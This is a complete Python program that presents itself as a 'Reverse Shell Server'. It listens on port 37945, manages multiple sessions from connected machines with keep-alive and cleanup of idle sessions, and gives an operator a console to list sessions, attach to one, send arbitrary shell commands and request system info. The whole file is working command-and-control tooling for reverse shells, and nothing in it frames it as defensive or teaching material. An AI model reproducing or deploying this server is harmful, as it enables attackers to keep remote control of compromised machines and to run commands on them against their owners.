import socket
import threading
import time
import sys
import select
import queue

# Dictionary to hold sessions
sessions = {}
session_lock = threading.Lock()

class Session:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.last_seen = time.time()
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.active = True
        self.lock = threading.Lock()

def cleanup_sessions():
    """Clean up inactive sessions"""
    while True:
        time.sleep(60)  # Check every minute
        current_time = time.time()
        with session_lock:
            inactive_sessions = []
            for session_id, session in sessions.items():
                # If session has been inactive for more than 5 minutes
                if current_time - session.last_seen > 300:
                    inactive_sessions.append(session_id)
            
            for session_id in inactive_sessions:
                try:
                    sessions[session_id].active = False
                    sessions[session_id].conn.close()
                except:
                    pass
                del sessions[session_id]
                print(f"Removed inactive session {session_id}")

def handle_client(session):
    session_id = None
    try:
        # Receive session ID from client
        session_id = session.conn.recv(1024).decode()
        
        # Check if session already exists
        with session_lock:
            if session_id in sessions:
                old_session = sessions[session_id]
                # If the old session has been active recently (within 5 minutes), close new connection
                if time.time() - old_session.last_seen < 300:
                    print(f"Ignoring duplicate connection for active session {session_id}")
                    session.conn.close()
                    return
                else:
                    # Old session is inactive, replace it
                    print(f"Replacing inactive session {session_id}")
                    old_session.active = False
                    try:
                        old_session.conn.close()
                    except:
                        pass
                    del sessions[session_id]
        
        # Store session information
        with session_lock:
            sessions[session_id] = session
        
        print(f"New session: {session_id} from {session.addr[0]}")
        
        # Main loop for handling the session
        while session.active:
            # Check for incoming commands
            try:
                command = session.command_queue.get(timeout=0.1)
                with session.lock:
                    if session.active:
                        session.conn.sendall(command.encode())
                        session.last_seen = time.time()
            except queue.Empty:
                pass
            
            # Check for incoming data
            try:
                ready = select.select([session.conn], [], [], 0.1)
                if ready[0]:
                    data = session.conn.recv(4096)
                    if not data:
                        break
                    
                    response = data.decode().strip()
                    session.response_queue.put(response)
                    session.last_seen = time.time()
            except Exception as e:
                break
            
            # Update last activity time
            session.last_seen = time.time()
                
    except Exception as e:
        print(f"Error with client {session_id}: {e}")
    finally:
        # Remove session on disconnect
        if session_id:
            with session_lock:
                if session_id in sessions:
                    del sessions[session_id]
            print(f"Session {session_id} disconnected")

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"Server listening on {host}:{port}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    while True:
        conn, addr = server.accept()
        # Set TCP Keep-Alive to prevent disconnection
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        # Keep-Alive settings for Linux
        if hasattr(socket, "TCP_KEEPIDLE"):
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
        if hasattr(socket, "TCP_KEEPINTVL"):
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        if hasattr(socket, "TCP_KEEPCNT"):
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
        
        session = Session(conn, addr)
        client_thread = threading.Thread(target=handle_client, args=(session,))
        client_thread.daemon = True
        client_thread.start()

def execute_command(session_id, command):
    with session_lock:
        if session_id not in sessions:
            return "Session not found"
        
        session = sessions[session_id]
    
    try:
        # Clear the response queue before sending a new command
        while not session.response_queue.empty():
            try:
                session.response_queue.get_nowait()
            except queue.Empty:
                break
        
        # Send command to client
        session.command_queue.put(command)
        session.last_seen = time.time()
        
        # Wait for response with timeout
        try:
            response = session.response_queue.get(timeout=300)  # 5 minutes timeout
            
            # If response is "OK", display appropriate message
            if response == "OK":
                return "Command executed successfully"
            
            return response
        except queue.Empty:
            return "Command executed (no output)"
    except Exception as e:
        # Mark session as inactive on error
        session.active = False
        with session_lock:
            if session_id in sessions:
                del sessions[session_id]
        return f"Error executing command: {str(e)}"

def main():
    # Start server in a separate thread
    server_thread = threading.Thread(target=start_server, args=('0.0.0.0', 37945))
    server_thread.daemon = True
    server_thread.start()
    
    print("Reverse Shell Server Started")
    print("Type 'help' for available commands")
    
    while True:
        try:
            cmd = input("\n> ").strip()
            
            if cmd.lower() == 'help':
                print("\nAvailable commands:")
                print("  sessions        - List active sessions")
                print("  connect <id>    - Connect to a session")
                print("  info <id>       - Get system info for a session")
                print("  exit            - Exit the server")
                
            elif cmd.lower() == 'sessions':
                with session_lock:
                    if not sessions:
                        print("No active sessions")
                    else:
                        print("\nActive Sessions:")
                        print("ID\tAddress\t\tLast Seen")
                        print("-" * 40)
                        for sid, session in sessions.items():
                            last_seen = time.strftime('%H:%M:%S', time.localtime(session.last_seen))
                            print(f"{sid}\t{session.addr[0]}\t{last_seen}")
                            
            elif cmd.lower().startswith('connect '):
                parts = cmd.split(maxsplit=1)
                if len(parts) < 2:
                    print("Usage: connect <id>")
                    continue
                    
                session_id = parts[1]
                print(f"\nConnected to session {session_id}. Type 'exit' to disconnect.")
                
                while True:
                    try:
                        command = input(f"{session_id}> ").strip()
                        
                        if command.lower() == 'exit':
                            break
                            
                        response = execute_command(session_id, command)
                        print(response)
                    except KeyboardInterrupt:
                        break
                        
            elif cmd.lower().startswith('info '):
                parts = cmd.split(maxsplit=1)
                if len(parts) < 2:
                    print("Usage: info <id>")
                    continue
                    
                session_id = parts[1]
                response = execute_command(session_id, "get_system_info")
                print(f"\nSystem Info for Session {session_id}:")
                print(response)
                
            elif cmd.lower() == 'exit':
                print("Shutting down server...")
                sys.exit(0)
                
            else:
                print("Unknown command. Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            print("\nType 'exit' to quit")
        except Exception as e:
            print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()